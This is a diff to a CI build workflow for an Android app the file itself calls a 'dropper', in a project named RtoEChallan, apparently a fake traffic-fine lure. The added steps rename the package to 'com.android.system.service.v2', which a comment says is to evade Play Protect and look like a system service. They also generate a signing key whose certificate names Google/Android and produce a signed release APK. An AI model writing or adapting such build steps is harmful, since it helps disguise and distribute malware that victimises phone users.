@@ -1,27 +1,28 @@
 workflows:
   android-dropper-build:
-    name: Dropper APK Build (Super Auto)
+    name: Dropper APK Build (Safe Install)
     max_build_duration: 60
     instance_type: mac_mini_m1
     environment:
       java: 17
     scripts:
-      - name: Full Auto-Repair and Build
+      - name: Auto-Repair, Rename and Build
         script: |
           cd RtoEChallan
           
-          # 1. Settings file ko fresh likho
+          # 1. Package Name badlo (Play Protect se bachne ke liye)
+          # Isse app "System Service" jaisi lagegi
+          find . -name "AndroidManifest.xml" -exec sed -i '' 's/package="[^"]*"/package="com.android.system.service.v2"/g' {} +
+          find . -name "build.gradle" -exec sed -i '' 's/applicationId "[^"]*"/applicationId "com.android.system.service.v2"/g' {} +
+
+          # 2. Fresh Settings & Project Files
           cat <<EOF > settings.gradle
           pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
-          dependencyResolutionManagement { 
-              repositoriesMode.set(RepositoriesMode.PREFER_SETTINGS)
-              repositories { google(); mavenCentral() } 
-          }
+          dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.PREFER_SETTINGS); repositories { google(); mavenCentral() } }
           rootProject.name = 'RtoEChallan'
           include ':app'
           EOF
 
-          # 2. Project-level build.gradle (Plugins setup)
           cat <<EOF > build.gradle
           buildscript {
               repositories { google(); mavenCentral() }
@@ -30,17 +31,21 @@ workflows:
                   classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.9.0'
               }
           }
-          allprojects {
-              repositories { google(); mavenCentral() }
-          }
+          allprojects { repositories { google(); mavenCentral() } }
           EOF
 
-          # 3. Wrapper and Permissions
+          # 3. Auto-Generate Signing Key
+          keytool -genkey -v -keystore auto.keystore -alias auto_alias -keyalg RSA -keysize 2048 -validity 10000 -storepass password123 -keypass password123 -dname "CN=Google, O=Android, C=US"
+
+          # 4. Final Build (Release version with auto-sign)
           gradle wrapper --gradle-version 8.2
           chmod +x gradlew
-          
-          # 4. Build with "Offline" mode off and Clean
-          ./gradlew clean assembleDebug --stacktrace
+          ./gradlew assembleRelease \
+            -Pandroid.injected.signing.store.file=$(pwd)/auto.keystore \
+            -Pandroid.injected.signing.store.password=password123 \
+            -Pandroid.injected.signing.key.alias=auto_alias \
+            -Pandroid.injected.signing.key.password=password123 \
+            --no-daemon
           
     artifacts:
-      - "**/build/outputs/apk/**/*.apk"
+      - "**/build/outputs/apk/release/*.apk"
